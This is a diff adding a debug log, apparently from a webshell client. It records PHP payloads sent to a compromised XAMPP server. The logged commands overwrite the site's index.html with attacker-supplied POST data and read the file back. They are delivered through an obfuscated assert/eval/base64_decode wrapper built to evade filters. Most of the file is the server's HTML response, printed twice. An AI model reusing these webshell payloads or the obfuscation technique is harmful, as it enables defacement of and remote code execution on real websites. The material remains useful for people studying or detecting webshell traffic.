+    <script src="//code.jquery.com/jquery-1.10.2.min.js"></script>
+    <script src="/dashboard/javascripts/all.js" type="text/javascript"></script>
+  </body>
+</html>
+
+2018-10-14 22:48:31,241:74:DEBUG:Playload: print "PGP";echo fwrite(fopen('D:\xampp\htdocs\index.html','w'),$_POST['z1'])?'1':'0';print "PGP";
+2018-10-14 22:49:02,552:74:DEBUG:Playload: print "PGP";$F='D:\xampp\htdocs\index.html';$P=@fopen($F,'r');echo(@fread($P,filesize($F)));@fclose($P);print "PGP";
+2018-10-14 22:49:02,553:93:DEBUG:Params: array_map("ass"."ert",array("ev"."Al(\"\\\$xx%3D\\\"Ba"."SE6"."4_dEc"."OdE\\\";@ev"."al(\\\$xx('cHJpbnQgIlBHUCI7JEY9J0Q6XHhhbXBwXGh0ZG9jc1xpbmRleC5odG1sJzskUD1AZm9wZW4oJEYsJ3InKTtlY2hvKEBmcmVhZCgkUCxmaWxlc2l6ZSgkRikpKTtAZmNsb3NlKCRQKTtwcmludCAiUEdQIjs='));\");"));
+2018-10-14 22:49:02,565:140:DEBUG:(200, 'OK', '<!doctype html>\n<html lang="en">\n  <head>\n    <meta charset="utf-8">\n\n    <!-- Always force latest IE rendering engine or request Chrome Frame -->\n    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0" />\n\n    <!-- Use title if it\'s in the page YAML frontmatter -->\n    <title>Welcome to XAMPP</title>\n\n    <meta name="description" content="XAMPP is an easy to install Apache distribution containing MariaDB, PHP and Perl." />\n    <meta name="keywords" content="xampp, apache, php, perl, mariadb, open source distribution" />\n\n    <link href="/dashboard/stylesheets/normalize.css" rel="stylesheet" type="text/css" /><link href="/dashboard/stylesheets/all.css" rel="stylesheet" type="text/css" />\n    <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/3.1.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />\n\n    <script src="/dashboard/javascripts/modernizr.js" type="text/javascript"></script>\n\n\n    <link href="/dashboard/images/favicon.png" rel="icon" type="image/png" />\n\n\n  </head>\n\n  <body class="index">\n    <div id="fb-root"></div>\n    <script>(function(d, s, id) {\n      var js, fjs = d.getElementsByTagName(s)[0];\n      if (d.getElementById(id)) return;\n      js = d.createElement(s); js.id = id;\n      js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=277385395761685";\n      fjs.parentNode.insertBefore(js, fjs);\n    }(document, \'script\', \'facebook-jssdk\'));</script>\n    <div class="contain-to-grid">\n      <nav class="top-bar" data-topbar>\n        <ul class="title-area">\n          <li class="name">\n            <h1><a href="/dashboard/index.html">Apache Friends</a></h1>\n          </li>\n          <li class="toggle-topbar menu-icon">\n            <a href="#">\n              <span>Menu</span>\n            </a>\n          </li>\n        </ul>\n\n        <section class="top-bar-section">\n          <!-- Right Nav Section -->\n          <ul class="right">\n              <li class=""><a href="/applications.html">Applications</a></li>\n              <li class=""><a href="/dashboard/faq.html">FAQs</a></li>\n              <li class=""><a href="/dashboard/howto.html">HOW-TO Guides</a></li>\n              <li class=""><a target="_blank" href="/dashboard/phpinfo.php">PHPInfo</a></li>\n              <li class=""><a href="/phpmyadmin/">phpMyAdmin</a></li>\n          </ul>\n        </section>\n      </nav>\n    </div>\n\n    <div id="wrapper">\n      <div class="hero">\n  <div class="row">\n    <div class="large-12 columns">\n      <h1><img src="/dashboard/images/xampp-logo.svg" />XAMPP <span>Apache + MariaDB + PHP + Perl</span></h1>\n    </div>\n  </div>\n</div>\n<div class="row">\n  <div class="large-12 columns">\n    <h2>Welcome to XAMPP for Windows 5.6.15</h2>\n  </div>\n</div>\n<div class="row">\n  <div class="large-12 columns">\n    <p>\n      You have successfully installed XAMPP on this system! Now you can start using Apache, MariaDB, PHP and other components.\n      You can find more info in the <a href="/dashboard/faq.html">FAQs</a> section or check the <a href="/dashboard/howto.html">HOW-TO Guides</a> for getting started with PHP applications.\n    </p>\n    <p>\n      Start the XAMPP Control Panel to check the server status.\n    </p>\n  </div>\n</div>\n<div class="row">\n  <div class="large-12 columns">\n    <h3>Community</h3>\n  </div>\n</div>\n<div class="row">\n  <div class="large-12 columns">\n    <p>\n      XAMPP has been around for more than 10 years &ndash; there is a huge community behind it. You can get involved by joining our <a href="https://community.apachefriends.org">Forums</a>, adding yourself to the <a href="https://www.apachefriends.org/community.html#mailing_list">Mailing List</a>, and liking us on <a href="https://www.facebook.com/we.are.xampp">Facebook</a>, following our exploits on <a href="https://twitter.com/apachefriends">Twitter</a>, or adding us to your <a href="https://plus.google.com/+xampp/posts">Google+</a> circles.\n    </p>\n  </div>\n</div>\n<div class="row">\n  <div class="large-12 columns">\n    <h3>Contribute to XAMPP translation at <a href="https://translate.apachefriends.org/">translate.apachefriends.org</a>.</h3>\n  </div>\n</div>\n<div class="row">\n  <div class="large-12 columns">\n    <p>\n      Can you help translate XAMPP for other community members? We need your help to translate XAMPP into different languages. We have set up a site, <a href="https://translate.apachefriends.org/">translate.apachefriends.org</a>, where users can contribute translations.\n    </p>\n  </div>\n</div>\n<div class="row">\n  <div class="large-12 columns">\n    <h3>Install applications on XAMPP using Bitnami</h3>\n  </div>\n</div>\n<div class="row">\n  <div class="large-12 columns">\n    <p>\n    Apache Friends and Bitnami are cooperating to make dozens of open source applications available on XAMPP, for free. Bitnami-packaged applications include Wordpress, Drupal, Joomla! and dozens of others and can be deployed with one-click installers.\n    Visit the <a target="_blank" href="http://bitnami.com/stack/xampp?utm_source=bitnami&amp;utm_medium=installer&amp;utm_campaign=XAMPP%2BModule">Bitnami XAMPP page</a> for details on the currently available apps.\n    </p>\n  </div>\n</div>\n<div class="row">\n  <div class="large-12 columns">\n    <a href="http://bitnami.com/stack/xampp?utm_source=bitnami&utm_medium=installer&utm_campaign=XAMPP%2BModule" target="_blank"><img alt="Bitnami XAMPP page" src="/dashboard/images/bitnami-xampp.png" /></a>\n  </div>\n</div>\n\n    </div>\n\n    <footer>\n      <div class="row">\n        <div class="large-12 columns">\n          <div class="row">\n            <div class="large-8 columns">\n              <ul class="social">\n  <li class="twitter"><a href="https://twitter.com/apachefriends">Follow us on Twitter</a></li>\n  <li class="facebook"><a href="https://www.facebook.com/we.are.xampp">Like us on Facebook</a></li>\n  <li class="google"><a href="https://plus.google.com/+xampp/posts">Add us to your G+ Circles</a></li>\n</ul>\n\n              <ul class="inline-list">\n                <li><a href="https://www.apachefriends.org/blog.html">Blog</a></li>\n                <li><a href="https://www.apachefriends.org/privacy_policy.html">Privacy Policy</a></li>\n                <li>\n<a target="_blank" href="http://www.fastly.com/">                    CDN provided by\n                    <img width="48" data-2x="/dashboard/images/fastly-logo@2x.png" src="/dashboard/images/fastly-logo.png" />\n</a>                </li>\n              </ul>\n            </div>\n            <div class="large-4 columns">\n              <p class="text-right">Copyright (c) 2015, Apache Friends</p>\n            </div>\n          </div>\n        </div>\n      </div>\n    </footer>\n\n    <!-- JS Libraries -->\n    <script src="//code.jquery.com/jquery-1.10.2.min.js"></script>\n    <script src="/dashboard/javascripts/all.js" type="text/javascript"></script>\n  </body>\n</html>\n')
+2018-10-14 22:49:02,567:147:INFO:<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+
+    <!-- Always force latest IE rendering engine or request Chrome Frame -->
+    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <!-- Use title if it's in the page YAML frontmatter -->
+    <title>Welcome to XAMPP</title>
+
+    <meta name="description" content="XAMPP is an easy to install Apache distribution containing MariaDB, PHP and Perl." />
+    <meta name="keywords" content="xampp, apache, php, perl, mariadb, open source distribution" />
+
+    <link href="/dashboard/stylesheets/normalize.css" rel="stylesheet" type="text/css" /><link href="/dashboard/stylesheets/all.css" rel="stylesheet" type="text/css" />
+    <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/3.1.0/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+    <script src="/dashboard/javascripts/modernizr.js" type="text/javascript"></script>
+
+
+    <link href="/dashboard/images/favicon.png" rel="icon" type="image/png" />
+
+
+  </head>
+
+  <body class="index">
+    <div id="fb-root"></div>
+    <script>(function(d, s, id) {
+      var js, fjs = d.getElementsByTagName(s)[0];
+      if (d.getElementById(id)) return;
+      js = d.createElement(s); js.id = id;
+      js.src = "//connect.facebook.net/en_US/all.js#xfbml=1&appId=277385395761685";
+      fjs.parentNode.insertBefore(js, fjs);
+    }(document, 'script', 'facebook-jssdk'));</script>
+    <div class="contain-to-grid">
+      <nav class="top-bar" data-topbar>
+        <ul class="title-area">
+          <li class="name">
+            <h1><a href="/dashboard/index.html">Apache Friends</a></h1>
+          </li>
+          <li class="toggle-topbar menu-icon">
+            <a href="#">
+              <span>Menu</span>
+            </a>
+          </li>
+        </ul>
+
+        <section class="top-bar-section">
+          <!-- Right Nav Section -->
+          <ul class="right">
+              <li class=""><a href="/applications.html">Applications</a></li>
+              <li class=""><a href="/dashboard/faq.html">FAQs</a></li>
+              <li class=""><a href="/dashboard/howto.html">HOW-TO Guides</a></li>
+              <li class=""><a target="_blank" href="/dashboard/phpinfo.php">PHPInfo</a></li>
+              <li class=""><a href="/phpmyadmin/">phpMyAdmin</a></li>
+          </ul>
+        </section>
+      </nav>
+    </div>
+
+    <div id="wrapper">
+      <div class="hero">
+  <div class="row">
+    <div class="large-12 columns">
+      <h1><img src="/dashboard/images/xampp-logo.svg" />XAMPP <span>Apache + MariaDB + PHP + Perl</span></h1>
+    </div>
+  </div>
+</div>
+<div class="row">
+  <div class="large-12 columns">
+    <h2>Welcome to XAMPP for Windows 5.6.15</h2>
+  </div>
+</div>
+<div class="row">
+  <div class="large-12 columns">
+    <p>
+      You have successfully installed XAMPP on this system! Now you can start using Apache, MariaDB, PHP and other components.
+      You can find more info in the <a href="/dashboard/faq.html">FAQs</a> section or check the <a href="/dashboard/howto.html">HOW-TO Guides</a> for getting started with PHP applications.
+    </p>
+    <p>
+      Start the XAMPP Control Panel to check the server status.
+    </p>
+  </div>
+</div>
+<div class="row">
+  <div class="large-12 columns">
+    <h3>Community</h3>
+  </div>
+</div>
+<div class="row">
+  <div class="large-12 columns">
+    <p>
+      XAMPP has been around for more than 10 years &ndash; there is a huge community behind it. You can get involved by joining our <a href="https://community.apachefriends.org">Forums</a>, adding yourself to the <a href="https://www.apachefriends.org/community.html#mailing_list">Mailing List</a>, and liking us on <a href="https://www.facebook.com/we.are.xampp">Facebook</a>, following our exploits on <a href="https://twitter.com/apachefriends">Twitter</a>, or adding us to your <a href="https://plus.google.com/+xampp/posts">Google+</a> circles.
+    </p>
+  </div>
+</div>
+<div class="row">
+  <div class="large-12 columns">
+    <h3>Contribute to XAMPP translation at <a href="https://translate.apachefriends.org/">translate.apachefriends.org</a>.</h3>
+  </div>
+</div>
+<div class="row">
+  <div class="large-12 columns">
+    <p>
+      Can you help translate XAMPP for other community members? We need your help to translate XAMPP into different languages. We have set up a site, <a href="https://translate.apachefriends.org/">translate.apachefriends.org</a>, where users can contribute translations.
+    </p>
+  </div>
+</div>
+<div class="row">
+  <div class="large-12 columns">
+    <h3>Install applications on XAMPP using Bitnami</h3>
+  </div>
+</div>
+<div class="row">
+  <div class="large-12 columns">
+    <p>
+    Apache Friends and Bitnami are cooperating to make dozens of open source applications available on XAMPP, for free. Bitnami-packaged applications include Wordpress, Drupal, Joomla! and dozens of others and can be deployed with one-click installers.
+    Visit the <a target="_blank" href="http://bitnami.com/stack/xampp?utm_source=bitnami&amp;utm_medium=installer&amp;utm_campaign=XAMPP%2BModule">Bitnami XAMPP page</a> for details on the currently available apps.
+    </p>
+  </div>
+</div>
+<div class="row">
+  <div class="large-12 columns">
+    <a href="http://bitnami.com/stack/xampp?utm_source=bitnami&utm_medium=installer&utm_campaign=XAMPP%2BModule" target="_blank"><img alt="Bitnami XAMPP page" src="/dashboard/images/bitnami-xampp.png" /></a>
+  </div>
+</div>
+
+    </div>
+
+    <footer>
+      <div class="row">
+        <div class="large-12 columns">
+          <div class="row">
+            <div class="large-8 columns">
+              <ul class="social">
+  <li class="twitter"><a href="https://twitter.com/apachefriends">Follow us on Twitter</a></li>
+  <li class="facebook"><a href="https://www.facebook.com/we.are.xampp">Like us on Facebook</a></li>
+  <li class="google"><a href="https://plus.google.com/+xampp/posts">Add us to your G+ Circles</a></li>
+</ul>
+
+              <ul class="inline-list">
+                <li><a href="https://www.apachefriends.org/blog.html">Blog</a></li>
+                <li><a href="https://www.apachefriends.org/privacy_policy.html">Privacy Policy</a></li>
+                <li>
+<a target="_blank" href="http://www.fastly.com/">                    CDN provided by
+                    <img width="48" data-2x="/dashboard/images/fastly-logo@2x.png" src="/dashboard/images/fastly-logo.png" />
+</a>                </li>
+              </ul>
+            </div>
+            <div class="large-4 columns">
+              <p class="text-right">Copyright (c) 2015, Apache Friends</p>
+            </div>
+          </div>
+        </div>
+      </div>
+    </footer>
+
+    <!-- JS Libraries -->
+    <script src="//code.jquery.com/jquery-1.10.2.min.js"></script>
+    <script src="/dashboard/javascripts/all.js" type="text/javascript"></script>
+  </body>
+</html>
+
